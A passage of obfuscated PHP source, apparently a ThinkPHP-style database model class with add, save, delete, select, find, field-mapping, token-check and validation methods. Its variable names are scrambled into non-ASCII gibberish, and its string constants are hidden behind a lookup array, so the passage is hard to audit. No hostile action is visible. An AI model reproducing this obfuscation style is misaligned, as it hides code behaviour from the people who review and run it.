(think_config($É°»æÉ[246])) { $this->fields[$É°»æÉ[247]] = think_config($É°»æÉ[246]); } if (think_config($É°»æÉ[243])) { $¨³²‘¶§ = $this->dbName ? $this->dbName : think_config($É°»æÉ[244]); think_var_cache($É°»æÉ[245] . strtolower(get_path_this($¨³²‘¶§) . $É°»æÉ[95] . $this->name), $this->fields); } } public function switchModel($ğôÕ£ô–, $½ğĞË— = array()) { $¢ºô®Ÿœ =& $_SERVER[Ù×¯Ø…]; $äóÊ©´ = ucwords(strtolower($ğôÕ£ô–)) . $¢ºô®Ÿœ[251]; if (!class_exists($äóÊ©´)) { think_exception($äóÊ©´ . think_lang($¢ºô®Ÿœ[252])); } $this->_extModel = new $äóÊ©´($this->name); if (!empty($½ğĞË—)) { foreach ($½ğĞË— as $ã²ã®‰¬) { $this->_extModel->setProperty($ã²ã®‰¬, $this->{$ã²ã®‰¬}); } } return $this->_extModel; } public function __set($£¢îĞƒÂ, $“äæ†àö) { $this->data[$£¢îĞƒÂ] = $“äæ†àö; } public function __get($öâšåšò) { return isset($this->data[$öâšåšò]) ? $this->data[$öâšåšò] : null; } public function __isset($†âÊ¦üè) { return isset($this->data[$†âÊ¦üè]); } public function __unset($ùÎ›Ÿñß) { unset($this->data[$ùÎ›Ÿñß]); } public function __call($è•£’Ÿ, $š­¬Ï¼Ú) { $·èÃåç‡ =& $_SERVER[Ù×¯Ø…]; if (in_array(strtolower($è•£’Ÿ), $this->methods, !0)) { $this->options[strtolower($è•£’Ÿ)] = $š­¬Ï¼Ú[0]; return $this; } elseif (in_array(strtolower($è•£’Ÿ), array($·èÃåç‡[253], $·èÃåç‡[254], $·èÃåç‡[255], $·èÃåç‡[256], $·èÃåç‡[257]), !0)) { $Ê–òÌŠ = isset($š­¬Ï¼Ú[0]) ? $š­¬Ï¼Ú[0] : $·èÃåç‡[182]; $Ê–òÌŠ = $this->db->parseKey($Ê–òÌŠ); return $this->getField(strtoupper($è•£’Ÿ) . $·èÃåç‡[258] . $Ê–òÌŠ . $·èÃåç‡[259] . $è•£’Ÿ, $·èÃåç‡[253]); } elseif (strtolower(substr($è•£’Ÿ, 0, 5)) == $·èÃåç‡[260]) { $Ê–òÌŠ = think_parse_name(substr($è•£’Ÿ, 5)); $ñì½‰µÛ[$Ê–òÌŠ] = $š­¬Ï¼Ú[0]; return $this->where($ñì½‰µÛ)->find(); } elseif (strtolower(substr($è•£’Ÿ, 0, 10)) == $·èÃåç‡[261]) { $éîßÎ´ = think_parse_name(substr($è•£’Ÿ, 10)); $ñì½‰µÛ[$éîßÎ´] = $š­¬Ï¼Ú[0]; return $this->where($ñì½‰µÛ)->getField($š­¬Ï¼Ú[1]); } elseif (isset($this->_scope[$è•£’Ÿ])) { return $this->scope($è•£’Ÿ, $š­¬Ï¼Ú[0]); } elseif (method_exists($this, $è•£’Ÿ)) { array_unshift($š­¬Ï¼Ú, $è•£’Ÿ); return call_user_func_array(array($this, $·èÃåç‡[262]), $š­¬Ï¼Ú); } else { return call_user_func_array(array(parent, $è•£’Ÿ), $š­¬Ï¼Ú); } } protected function call() { $Ïì‡ôÏˆ =& $_SERVER[Ù×¯Ø…]; $œıÄ®¡Ø = func_get_args(); $ƒÖıâÆÃ = array_shift($œıÄ®¡Ø); $³÷«Ã´Á = $ƒÖıâÆÃ; if (is_array($ƒÖıâÆÃ)) { $³÷«Ã´Á = $ƒÖıâÆÃ[1]; $ƒÖıâÆÃ = $ƒÖıâÆÃ[0]; } $ßçÍˆ« = count($œıÄ®¡Ø) - 1; if (isset($œıÄ®¡Ø[$ßçÍˆ«]) && $œıÄ®¡Ø[$ßçÍˆ«] === $ƒÖıâÆÃ) { think_exception(__CLASS__ . $Ïì‡ôÏˆ[4] . $ƒÖıâÆÃ . think_lang($Ïì‡ôÏˆ[263])); return; } $œıÄ®¡Ø[] = $ƒÖıâÆÃ; if (method_exists($this, $Ïì‡ôÏˆ[264])) { $ÁšÊ×ß = call_user_func_array(array($this, $Ïì‡ôÏˆ[265]), array($³÷«Ã´Á, $œıÄ®¡Ø)); if (!is_null($ÁšÊ×ß) && $ÁšÊ×ß !== !1) { return $ÁšÊ×ß; } } $ƒ›µ·Ù = call_user_func_array(array($this, $ƒÖıâÆÃ), $œıÄ®¡Ø); if (method_exists($this, $Ïì‡ôÏˆ[266])) { $ÁšÊ×ß = call_user_func_array(array($this, $Ïì‡ôÏˆ[267]), array($³÷«Ã´Á, $œıÄ®¡Ø, $ƒ›µ·Ù)); if ($ÁšÊ×ß) { return $ÁšÊ×ß; } } return $ƒ›µ·Ù; } protected function _initialize() { } protected function _facade($´€éÎ¹ı) { $­·¦§‘ë =& $_SERVER[Ù×¯Ø…]; if (!empty($this->fields)) { foreach ($´€éÎ¹ı as $´äæûñ… => $­Ë²ÓÚş) { if (is_array($this->fields) && !in_array($´äæûñ…, $this->fields, !0)) { unset($´€éÎ¹ı[$´äæûñ…]); } elseif (is_scalar($­Ë²ÓÚş)) { $this->_parseType($´€éÎ¹ı, $´äæûñ…); } } } if (!empty($this->options[$­·¦§‘ë[268]])) { $´€éÎ¹ı = array_map($this->options[$­·¦§‘ë[268]], $´€éÎ¹ı); unset($this->options[$­·¦§‘ë[268]]); } $this->_beforeWrite($´€éÎ¹ı); return $´€éÎ¹ı; } protected function _beforeWrite(&$áÂÅ‚¶‰) { } public function add($Ó‰¬¢ºé = '', $‡áùÜ— = array(), $¬¦û¸± = false) { if (empty($Ó‰¬¢ºé)) { if (!empty($this->data)) { $Ó‰¬¢ºé = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ù×¯Ø…][269]); return !1; } } $‡áùÜ— = $this->_parseOptions($‡áùÜ—); $Ó‰¬¢ºé = $this->_facade($Ó‰¬¢ºé); if (!1 === $this->_beforeInsert($Ó‰¬¢ºé, $‡áùÜ—)) { return !1; } $ÌóÖ¢í = $this->db->insert($Ó‰¬¢ºé, $‡áùÜ—, $¬¦û¸±); if (!1 !== $ÌóÖ¢í) { $…„ÎæÃ¬ = $this->getLastInsID(); if ($…„ÎæÃ¬) { $Ó‰¬¢ºé[$this->getPk()] = $…„ÎæÃ¬; $this->_after_insert($Ó‰¬¢ºé, $‡áùÜ—); return $…„ÎæÃ¬; } $this->_after_insert($Ó‰¬¢ºé, $‡áùÜ—); } return $ÌóÖ¢í; } protected function _beforeInsert(&$€ƒ—™³, $¤Ì½¶ØÈ) { } protected function _after_insert($ÏöÆ »ã, $×ïÈÜ™ï) { } public function addAll($»¾Àüùê, $şÖ“…• = array(), $æª©ÏÉû = false) { $¦Ãµ·ç =& $_SERVER[Ù×¯Ø…]; if (empty($»¾Àüùê)) { $this->error = think_lang($¦Ãµ·ç[269]); return !1; } $şÖ“…• = $this->_parseOptions($şÖ“…•); foreach ($»¾Àüùê as $ĞºïÅ => $Ğ«ÅßÕñ) { $»¾Àüùê[$ĞºïÅ] = $this->_facade($Ğ«ÅßÕñ); } if (method_exists($this->db, $¦Ãµ·ç[270])) { $•®ÂÙÏ¹ = $this->db->insertAll($»¾Àüùê, $şÖ“…•, $æª©ÏÉû); } else { $this->startTrans(); foreach ($»¾Àüùê as $ĞºïÅ => $Ğ«ÅßÕñ) { $•®ÂÙÏ¹ = $this->db->insert($Ğ«ÅßÕñ, $şÖ“…•, $æª©ÏÉû); } $this->commit(); } if (!1 !== $•®ÂÙÏ¹) { $¢øúë¯Ø = $this->getLastInsID(); if ($¢øúë¯Ø) { return $¢øúë¯Ø; } } return $•®ÂÙÏ¹; } public function selectAdd($õõöüŸÏ = '', $…ğ‘’€¡ = '', $ÇÑœÀ§ = array()) { $µÄƒéê‹ =& $_SERVER[Ù×¯Ø…]; $ÇÑœÀ§ = $this->_parseOptions($ÇÑœÀ§); if (!1 === ($¦Œâè° = $this->db->selectInsert($õõöüŸÏ ? $õõöüŸÏ : $ÇÑœÀ§[$µÄƒéê‹[271]], $…ğ‘’€¡ ? $…ğ‘’€¡ : $this->getTableName(), $ÇÑœÀ§))) { $this->error = think_lang($µÄƒéê‹[272]); return !1; } else { return $¦Œâè°; } } public function save($öê•Ñµ± = '', $ç€â‰»Ë = array()) { $¼¾‰ü¿£ =& $_SERVER[Ù×¯Ø…]; if (empty($öê•Ñµ±)) { if (!empty($this->data)) { $öê•Ñµ± = $this->data; $this->data = array(); } else { $this->error = think_lang($¼¾‰ü¿£[269]); return !1; } } $öê•Ñµ± = $this->_facade($öê•Ñµ±); $ç€â‰»Ë = $this->_parseOptions($ç€â‰»Ë); $ìúì‚´© = $this->getPk(); if (!isset($ç€â‰»Ë[$¼¾‰ü¿£[273]])) { if (isset($öê•Ñµ±[$ìúì‚´©])) { $àüıÓÄé[$ìúì‚´©] = $öê•Ñµ±[$ìúì‚´©]; $ç€â‰»Ë[$¼¾‰ü¿£[273]] = $àüıÓÄé; unset($öê•Ñµ±[$ìúì‚´©]); } else { $this->error = think_lang($¼¾‰ü¿£[272]); return !1; } } if (is_array($ç€â‰»Ë[$¼¾‰ü¿£[273]]) && isset($ç€â‰»Ë[$¼¾‰ü¿£[273]][$ìúì‚´©])) { $•€ÃÓàÃ = $ç€â‰»Ë[$¼¾‰ü¿£[273]][$ìúì‚´©]; } if (!1 === $this->_beforeUpdate($öê•Ñµ±, $ç€â‰»Ë)) { return !1; } $•“ÓÔ = $this->db->update($öê•Ñµ±, $ç€â‰»Ë); if (!1 !== $•“ÓÔ) { if (isset($•€ÃÓàÃ)) { $öê•Ñµ±[$ìúì‚´©] = $•€ÃÓàÃ; } $this->_afterUpdate($öê•Ñµ±, $ç€â‰»Ë); } return $•“ÓÔ; } protected function _beforeUpdate(&$úÁÏ³ö¢, $µšËÎÓ¥) { } protected function _afterUpdate($ÀûÓ§ÆÁ, $Ã°³ÄÅ¦) { } public function delete($¨Áıæ¡‹ = array()) { $’—µµÚ =& $_SERVER[Ù×¯Ø…]; if (empty($¨Áıæ¡‹) && empty($this->options[$’—µµÚ[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $÷‰­¦ÛË = $this->getPk(); if (is_numeric($¨Áıæ¡‹) || is_string($¨Áıæ¡‹)) { if (strpos($¨Áıæ¡‹, $’—µµÚ[47])) { $Åœš‘ü[$÷‰­¦ÛË] = array($’—µµÚ[274], $¨Áıæ¡‹); } else { $Åœš‘ü[$÷‰­¦ÛË] = $¨Áıæ¡‹; } $this->options[$’—µµÚ[273]] = $Åœš‘ü; } $¨Áıæ¡‹ = $this->_parseOptions(); if (is_array($¨Áıæ¡‹[$’—µµÚ[273]]) && isset($¨Áıæ¡‹[$’—µµÚ[273]][$÷‰­¦ÛË])) { $ø½£®† = $¨Áıæ¡‹[$’—µµÚ[273]][$÷‰­¦ÛË]; } $ÍêŠß’µ = $this->db->delete($¨Áıæ¡‹); if (!1 !== $ÍêŠß’µ) { $’—Û¬Ëš = array(); if (isset($ø½£®†)) { $’—Û¬Ëš[$÷‰­¦ÛË] = $ø½£®†; } $this->_after_delete($’—Û¬Ëš, $¨Áıæ¡‹); } return $ÍêŠß’µ; } protected function _after_delete($ã•‹À÷, $£‡˜ØÌ—) { } public function select($ú­¾İØ— = array()) { $ï ÌÖ¡ =& $_SERVER[Ù×¯Ø…]; if (is_string($ú­¾İØ—) || is_numeric($ú­¾İØ—)) { $¬šÆ¶§¸ = $this->getPk(); if (strpos($ú­¾İØ—, $ï ÌÖ¡[47])) { $¥€Ö‹Ÿ[$¬šÆ¶§¸] = array($ï ÌÖ¡[274], $ú­¾İØ—); } else { $¥€Ö‹Ÿ[$¬šÆ¶§¸] = $ú­¾İØ—; } $this->options[$ï ÌÖ¡[273]] = $¥€Ö‹Ÿ; } elseif (!1 === $ú­¾İØ—) { $ú­¾İØ— = $this->_parseOptions(); return $ï ÌÖ¡[275] . $this->db->buildSelectSql($ú­¾İØ—) . $ï ÌÖ¡[276]; } $ú­¾İØ— = $this->_parseOptions(); $ìŠ­Ïüİ = $this->db->select($ú­¾İØ—); if (!1 === $ìŠ­Ïüİ) { return !1; } if (empty($ìŠ­Ïüİ)) { return null; } $this->_afterSelect($ìŠ­Ïüİ, $ú­¾İØ—); return $ìŠ­Ïüİ; } protected function _afterSelect(&$¶÷ÂÅ¿ó, $Ø²–æ©Å) { } public function buildSql($üÙ¼¢èï = array()) { $ö‡áö‡í =& $_SERVER[Ù×¯Ø…]; $üÙ¼¢èï = $this->_parseOptions($üÙ¼¢èï); return $ö‡áö‡í[275] . $this->db->buildSelectSql($üÙ¼¢èï) . $ö‡áö‡í[276]; } public function optionsValue($Õ¨ÂÙÚ© = null) { if (is_null($Õ¨ÂÙÚ©)) { return $this->options; } elseif (is_array($Õ¨ÂÙÚ©)) { $this->options = array_merge($this->options, $Õ¨ÂÙÚ©); } } protected function _parseOptions($å¦ÚÁùá = array()) { $ä¶¨æ˜° =& $_SERVER[Ù×¯Ø…]; if (is_array($å¦ÚÁùá)) { $å¦ÚÁùá = array_merge($this->options, $å¦ÚÁùá); } $this->options = array(); if (!isset($å¦ÚÁùá[$ä¶¨æ˜°[277]])) { $å¦ÚÁùá[$ä¶¨æ˜°[277]] = $this->getTableName(); $¢‚³•æ = $this->fields; } else { $¢‚³•æ = $this->getDbFields(); } if (!empty($å¦ÚÁùá[$ä¶¨æ˜°[278]])) { $å¦ÚÁùá[$ä¶¨æ˜°[277]] .= $ä¶¨æ˜°[50] . $å¦ÚÁùá[$ä¶¨æ˜°[278]]; } $å¦ÚÁùá[$ä¶¨æ˜°[279]] = $this->name; if (isset($å¦ÚÁùá[$ä¶¨æ˜°[273]]) && is_array($å¦ÚÁùá[$ä¶¨æ˜°[273]]) && !empty($¢‚³•æ) && !isset($å¦ÚÁùá[$ä¶¨æ˜°[280]]) && !isset($å¦ÚÁùá[$ä¶¨æ˜°[277]])) { foreach ($å¦ÚÁùá[$ä¶¨æ˜°[273]] as $ó’Ê°İª => $ŠüğúÕÊ) { $ó’Ê°İª = trim($ó’Ê°İª); if (in_array($ó’Ê°İª, $¢‚³•æ, !0)) { if (is_scalar($ŠüğúÕÊ)) { $this->_parseType($å¦ÚÁùá[$ä¶¨æ˜°[273]], $ó’Ê°İª); } } elseif (!is_numeric($ó’Ê°İª) && $ä¶¨æ˜°[71] != substr($ó’Ê°İª, 0, 1) && !1 === strpos($ó’Ê°İª, $ä¶¨æ˜°[95]) && !1 === strpos($ó’Ê°İª, $ä¶¨æ˜°[258]) && !1 === strpos($ó’Ê°İª, $ä¶¨æ˜°[281]) && !1 === strpos($ó’Ê°İª, $ä¶¨æ˜°[282])) { unset($å¦ÚÁùá[$ä¶¨æ˜°[273]][$ó’Ê°İª]); } } } $this->_options_filter($å¦ÚÁùá); return $å¦ÚÁùá; } protected function _options_filter(&$š—‡ÀÌã) { } protected function _parseType(&$úğİî‹, $¸õòÀ½) { $Ü´ ‡ç¥ =& $_SERVER[Ù×¯Ø…]; if (empty($this->options[$Ü´ ‡ç¥[283]][$Ü´ ‡ç¥[4] . $¸õòÀ½])) { $™À‡£ÁÀ = strtolower($this->fields[$Ü´ ‡ç¥[250]][$¸õòÀ½]); if (!1 !== strpos($™À‡£ÁÀ, $Ü´ ‡ç¥[284])) { } elseif (!1 === strpos($™À‡£ÁÀ, $Ü´ ‡ç¥[285]) && !1 !== strpos($™À‡£ÁÀ, $Ü´ ‡ç¥[286])) { $úğİî‹[$¸õòÀ½] = intval($úğİî‹[$¸õòÀ½]); } elseif (!1 !== strpos($™À‡£ÁÀ, $Ü´ ‡ç¥[287]) || !1 !== strpos($™À‡£ÁÀ, $Ü´ ‡ç¥[288])) { $úğİî‹[$¸õòÀ½] = floatval($úğİî‹[$¸õòÀ½]); } elseif (!1 !== strpos($™À‡£ÁÀ, $Ü´ ‡ç¥[289])) { $úğİî‹[$¸õòÀ½] = (bool) $úğİî‹[$¸õòÀ½]; } } } public function find($îÇ£Õ¨ = array()) { $şšñ ˜´ =& $_SERVER[Ù×¯Ø…]; if (is_numeric($îÇ£Õ¨) || is_string($îÇ£Õ¨)) { $ñ›ˆ¯€Ï[$this->getPk()] = intval($îÇ£Õ¨); $this->options[$şšñ ˜´[273]] = $ñ›ˆ¯€Ï; } $this->options[$şšñ ˜´[290]] = 1; $îÇ£Õ¨ = $this->_parseOptions(); $¼Ñúæ´ü = $this->db->select($îÇ£Õ¨); if (!1 === $¼Ñúæ´ü) { return !1; } if (empty($¼Ñúæ´ü)) { return null; } $this->data = $¼Ñúæ´ü[0]; $this->_afterFind($this->data, $îÇ£Õ¨); if (!empty($this->options[$şšñ ˜´[291]])) { return $this->returnResult($this->data, $this->options[$şšñ ˜´[291]]); } return $this->data; } protected function _afterFind(&$®¥îÛÛ‡, $ø§°İÖô) { } protected function returnResult($Ñ‚ò¬Òº, $êŞ… = '') { $½´‰ŞÒ§ =& $_SERVER[Ù×¯Ø…]; if ($êŞ…) { if (is_callable($êŞ…)) { return call_user_func($êŞ…, $Ñ‚ò¬Òº); } switch (strtolower($êŞ…)) { case $½´‰ŞÒ§[292]: return json_encode($Ñ‚ò¬Òº); case $½´‰ŞÒ§[293]: return xml_encode($Ñ‚ò¬Òº); } } return $Ñ‚ò¬Òº; } public function parseFieldsMap($ŞÀËîç», $‹„ÀçËı = 1) { if (!empty($this->_map)) { foreach ($this->_map as $øÂ±™İµ => $ğª÷ü¾ê) { if ($‹„ÀçËı == 1) { if (isset($ŞÀËîç»[$ğª÷ü¾ê])) { $ŞÀËîç»[$øÂ±™İµ] = $ŞÀËîç»[$ğª÷ü¾ê]; unset($ŞÀËîç»[$ğª÷ü¾ê]); } } else { if (isset($ŞÀËîç»[$øÂ±™İµ])) { $ŞÀËîç»[$ğª÷ü¾ê] = $ŞÀËîç»[$øÂ±™İµ]; unset($ŞÀËîç»[$øÂ±™İµ]); } } } } return $ŞÀËîç»; } public function setField($¦Ø–ø™¨, $ì…ò‡¨õ = '') { if (is_array($¦Ø–ø™¨)) { $Ÿ„—õşÇ = $¦Ø–ø™¨; } else { $Ÿ„—õşÇ[$¦Ø–ø™¨] = $ì…ò‡¨õ; } return $this->save($Ÿ„—õşÇ); } public function setAdd($ª¸Ìğö, $‚º„Ï‡¿ = 1) { $èâÓİ€ =& $_SERVER[Ù×¯Ø…]; $Ô‘°şÅá = $ª¸Ìğö . $èâÓİ€[294] . $‚º„Ï‡¿; if ($‚º„Ï‡¿ < 0) { $Ô‘°şÅá = $ª¸Ìğö . $‚º„Ï‡¿; } return $this->setField($ª¸Ìğö, array($èâÓİ€[295], $Ô‘°şÅá)); } public function getField($˜ÓÀ¡¯, $¥µÊİüô = null) { $è‘ï®Ò‹ =& $_SERVER[Ù×¯Ø…]; $Ê½°ô–[$è‘ï®Ò‹[271]] = $˜ÓÀ¡¯; $Ê½°ô– = $this->_parseOptions($Ê½°ô–); $˜ÓÀ¡¯ = trim($˜ÓÀ¡¯); if (strpos($˜ÓÀ¡¯, $è‘ï®Ò‹[47])) { if (!isset($Ê½°ô–[$è‘ï®Ò‹[290]])) { $Ê½°ô–[$è‘ï®Ò‹[290]] = is_numeric($¥µÊİüô) ? $¥µÊİüô : $è‘ï®Ò‹[33]; } $ÕÒÍ¢‚ = $this->db->select($Ê½°ô–); if (!empty($ÕÒÍ¢‚)) { $Ï–Æ†ù = explode($è‘ï®Ò‹[47], $˜ÓÀ¡¯); $˜ÓÀ¡¯ = array_keys($ÕÒÍ¢‚[0]); $âùâİ¢‰ = array_shift($˜ÓÀ¡¯); $­ì†–¯Ê = array_shift($˜ÓÀ¡¯); $×µÁ¤“Ã = array(); $¥Ù«ŒÌŸ = count($Ï–Æ†ù); foreach ($ÕÒÍ¢‚ as $“²ßÊŞÇ) { $ªàû¥‘ = $“²ßÊŞÇ[$âùâİ¢‰]; if (2 == $¥Ù«ŒÌŸ) { $×µÁ¤“Ã[$ªàû¥‘] = $“²ßÊŞÇ[$­ì†–¯Ê]; } else { $×µÁ¤“Ã[$ªàû¥‘] = is_string($¥µÊİüô) ? implode($¥µÊİüô, $“²ßÊŞÇ) : $“²ßÊŞÇ; } } return $×µÁ¤“Ã; } } else { if (!0 !== $¥µÊİüô) { $Ê½°ô–[$è‘ï®Ò‹[290]] = is_numeric($¥µÊİüô) ? $¥µÊİüô : 1; } if ($¥µÊİüô === $è‘ï®Ò‹[253]) { unset($Ê½°ô–[$è‘ï®Ò‹[290]]); } $“²ßÊŞÇ = $this->db->select($Ê½°ô–); if (!empty($“²ßÊŞÇ)) { if ($¥µÊİüô === $è‘ï®Ò‹[253]) { return reset($“²ßÊŞÇ[0]); } if (!0 !== $¥µÊİüô && 1 == $Ê½°ô–[$è‘ï®Ò‹[290]]) { return reset($“²ßÊŞÇ[0]); } foreach ($“²ßÊŞÇ as $ôæµÃÊÔ) { $±§²æƒë[] = $ôæµÃÊÔ[$˜ÓÀ¡¯]; } return $±§²æƒë; } } return null; } public function create($­áÑŸãÄ = '', $¼ò¥ãèã = '') { $Õ´ÌıÃ =& $_SERVER[Ù×¯Ø…]; if (empty($­áÑŸãÄ)) { $­áÑŸãÄ = $_POST; } elseif (is_object($­áÑŸãÄ)) { $­áÑŸãÄ = get_object_vars($­áÑŸãÄ); } if (empty($­áÑŸãÄ) || !is_array($­áÑŸãÄ)) { $this->error = think_lang($Õ´ÌıÃ[269]); return !1; } $­áÑŸãÄ = $this->parseFieldsMap($­áÑŸãÄ, 0); $¼ò¥ãèã = $¼ò¥ãèã ? $¼ò¥ãèã : (!empty($­áÑŸãÄ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Õ´ÌıÃ[271]])) { $¦ú…¯ÁÒ = $this->options[$Õ´ÌıÃ[271]]; unset($this->options[$Õ´ÌıÃ[271]]); } elseif ($¼ò¥ãèã == THINK_MODEL_INSERT && isset($this->insertFields)) { $¦ú…¯ÁÒ = $this->insertFields; } elseif ($¼ò¥ãèã == THINK_MODEL_UPDATE && isset($this->updateFields)) { $¦ú…¯ÁÒ = $this->updateFields; } if (isset($¦ú…¯ÁÒ)) { if (is_string($¦ú…¯ÁÒ)) { $¦ú…¯ÁÒ = explode($Õ´ÌıÃ[47], $¦ú…¯ÁÒ); } if (think_config($Õ´ÌıÃ[296])) { $¦ú…¯ÁÒ[] = think_config($Õ´ÌıÃ[297]); } foreach ($­áÑŸãÄ as $ü«”Ë¨ => $”•Èò½·) { if (!in_array($ü«”Ë¨, $¦ú…¯ÁÒ)) { unset($­áÑŸãÄ[$ü«”Ë¨]); } } } if (!$this->autoValidation($­áÑŸãÄ, $¼ò¥ãèã)) { return !1; } if (!$this->autoCheckToken($­áÑŸãÄ)) { $this->error = think_lang($Õ´ÌıÃ[298]); return !1; } if ($this->autoCheckFields) { $¦ú…¯ÁÒ = $this->getDbFields(); foreach ($­áÑŸãÄ as $ü«”Ë¨ => $”•Èò½·) { if (!in_array($ü«”Ë¨, $¦ú…¯ÁÒ)) { unset($­áÑŸãÄ[$ü«”Ë¨]); } elseif (MAGIC_QUOTES_GPC && is_string($”•Èò½·)) { $­áÑŸãÄ[$ü«”Ë¨] = stripslashes($”•Èò½·); } } } $this->autoOperation($­áÑŸãÄ, $¼ò¥ãèã); $this->data = $­áÑŸãÄ; return $­áÑŸãÄ; } public function autoCheckToken($¢Ô€…Ñ†) { $™Æ‡ ó¤ =& $_SERVER[Ù×¯Ø…]; if (isset($this->options[$™Æ‡ ó¤[299]]) && !$this->options[$™Æ‡ ó¤[299]]) { return !0; } if (think_config($™Æ‡ ó¤[296])) { $¢¬”ôÖ™ = think_config($™Æ‡ ó¤[297]); if (!isset($¢Ô€…Ñ†[$¢¬”ôÖ™]) || Session::get($¢¬”ôÖ™)) { return !1; } list($ãíĞ¸õ, $÷ÍÆ™ùş) = explode($™Æ‡ ó¤[71], $¢Ô€…Ñ†[$¢¬”ôÖ™]); if ($÷ÍÆ™ùş && Session::get($¢¬”ôÖ™ . $™Æ‡ ó¤[95] . $ãíĞ¸õ) === $÷ÍÆ™ùş) { Session::remove($¢¬”ôÖ™ . $™Æ‡ ó¤[95] . $ãíĞ¸õ); return !0; } if (think_config($™Æ‡ ó¤[300])) { Session::remove($¢¬”ôÖ™ . $™Æ‡ ó¤[95] . $ãíĞ¸õ); } return !1; } return !0; } public function regex($ƒ¿‘í–ë, $´²ßå) { $¬“Ã‚Øˆ =& $_SERVER[Ù×¯Ø…]; $Óğ‚ˆşÀ = array($¬“Ã‚Øˆ[301] => $¬“Ã‚Øˆ[302], $¬“Ã‚Øˆ[303] => $¬“Ã‚Øˆ[304], $¬“Ã‚Øˆ[305] => $¬“Ã‚Øˆ[306], $¬“Ã‚Øˆ[307] => $¬“Ã‚Øˆ[308], $¬“Ã‚Øˆ[309] => $¬“Ã‚Øˆ[310], $¬“Ã‚Øˆ[311] => $¬“Ã‚Øˆ[312], $¬“Ã‚Øˆ[313] => $¬“Ã‚Øˆ[314], $¬“Ã‚Øˆ[288] => $¬“Ã‚Øˆ[315], $¬“Ã‚Øˆ[316] => $¬“Ã‚Øˆ[317]); if (isset($Óğ‚ˆşÀ[strtolower($´²ßå)])) { $´²ßå = $Óğ‚ˆşÀ[strtolower($´²ßå)]; } return preg_match($´²ßå, $ƒ¿‘í–ë) === 1; } private function autoOperation(&$şÃÎêß, $©µò¸¯ä) { $¶¼Ö¥¦ä =& $_SERVER[Ù×¯Ø…]; if (!empty($this->options[$¶¼Ö¥¦ä[318]])) { $¤ã•»Ş« = $this->options[$¶¼Ö¥¦ä[318]]; unset($this->options[$¶¼Ö¥¦ä[318]]); } elseif (!empty($this->_auto)) { $¤ã•»Ş« = $this->_auto; } if (isset($¤ã•»Ş«)) { foreach ($¤ã•»Ş« as $„®®Ì–²) { if (empty($„®®Ì–²[2])) { $„®®Ì–²[2] = THINK_MODEL_INSERT; } if ($©µò¸¯ä == $„®®Ì–²[2] || $„®®Ì–²[2] == THINK_MODEL_BOTH) { switch (trim($„®®Ì–²[3])) { case $¶¼Ö¥¦ä[319]: case $¶¼Ö¥¦ä[320]: $¢£Ú›” = isset($„®®Ì–²[4]) ? (array) $„®®Ì–²[4] : array(); if (isset($şÃÎêß[$„®®Ì–²[0]])) { array_unshift($¢£Ú›”, $şÃÎêß[$„®®Ì–²[0]]); } if ($¶¼Ö¥¦ä[319] == $„®®Ì–²[3]) { $şÃÎêß[$„®®Ì–²[0]] = call_user_func_array($„®®Ì–²[1], $¢£Ú›”); } else { $şÃÎêß[$„®®Ì–²[0]] = call_user_func_array(array(&$this, $„®®Ì–²[1]), $¢£Ú›”); } break; case $¶¼Ö¥¦ä[271]: $şÃÎêß[$„®®Ì–²[0]] = $şÃÎêß[$„®®Ì–²[1]]; break; case $¶¼Ö¥¦ä[321]: if ($¶¼Ö¥¦ä[33] === $şÃÎêß[$„®®Ì–²[0]]) { unset($şÃÎêß[$„®®Ì–²[0]]); } break; case $¶¼Ö¥¦ä[322]: default: $şÃÎêß[$„®®Ì–²[0]] = $„®®Ì–²[1]; } if (!1 === $şÃÎêß[$„®®Ì–²[0]]) { unset($şÃÎêß[$„®®Ì–²[0]]); } } } } return $şÃÎêß; } protected function autoValidation($¯†à–äÔ, $İ²ÙÉšË) { $ÚÏ†¤˜• =& $_SERVER[Ù×¯Ø…]; if (!empty($this->options[$ÚÏ†¤˜•[323]])) { $‘Š˜ëš = $this->options[$ÚÏ†¤˜•[323]]; unset($this->options[$ÚÏ†¤˜•[323]]); } elseif (!empty($this->_validate)) { $‘Š˜ëš = $this->_validate; } if (isset($‘Š˜ëš)) { if ($this->patchValidate) { $this->error = array(); } foreach ($‘Š˜ëš as $‘Ÿİ‰ÏÎ => $È÷à‰Ô¿) { if (empty($È÷à‰Ô¿[5]) || $È÷à‰Ô¿[5] == THINK_MODEL_BOTH || $È÷à‰Ô¿[5] == $İ²ÙÉšË) { if (0 == strpos($È÷à‰Ô¿[2], $ÚÏ†¤˜•[324]) && strpos($È÷à‰Ô¿[2], $ÚÏ†¤˜•[325])) { $È÷à‰Ô¿[2] = think_lang(substr($È÷à‰Ô¿[2], 2, -1)); } $È÷à‰Ô¿[3] = isset($È÷à‰Ô¿[3]) ? $È÷à‰Ô¿[3] : THINK_EXISTS_VALIDATE; $È÷à‰Ô¿[4] = isset($È÷à‰Ô¿[4]) ? $È÷à‰Ô¿[4] : $ÚÏ†¤˜•[326]; switch ($È÷à‰Ô¿[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($¯†à–äÔ, $È÷à‰Ô¿)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ÚÏ†¤˜•[33] != trim($¯†à–äÔ[$È÷à‰Ô¿[0]])) { if (!1 === $this->_validationField($¯†à–äÔ, $È÷à‰Ô¿)) { return !1; } } break; default: if (isset($¯†à–äÔ[$È÷à‰Ô¿[0]])) { if (!1 === $this->_validationField($¯†à–äÔ, $È÷à‰Ô¿)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($¿­§¯×, $Ô¦ÃòË) { if (!1 === $this->_validationFieldItem($¿­§¯×, $Ô¦ÃòË)) { if ($this->patchValidate) { $this->error[$Ô¦ÃòË[0]] = $Ô¦ÃòË[2]; } else { $this->error = $Ô¦ÃòË[2]; return !1; } } return; } protected function _validationFieldItem($óìŒ‚’†, $Î½£çğè) { $õèÕ§ÙÒ =& $_SERVER[Ù×¯Ø…]; switch (strtolower(trim($Î½£çğè[4]))) { case $õèÕ§ÙÒ[319]: case $õèÕ§ÙÒ[320]: $ò¾ğÂã = isset($Î½£çğè[6]) ? (array) $Î½£çğè[6] : array(); if (is_string($Î½£çğè[0]) && strpos($Î½£çğè[0], $õèÕ§ÙÒ[47])) { $Î½£çğè[0] = explode($õèÕ§ÙÒ[47], $Î½£çğè[0]); } 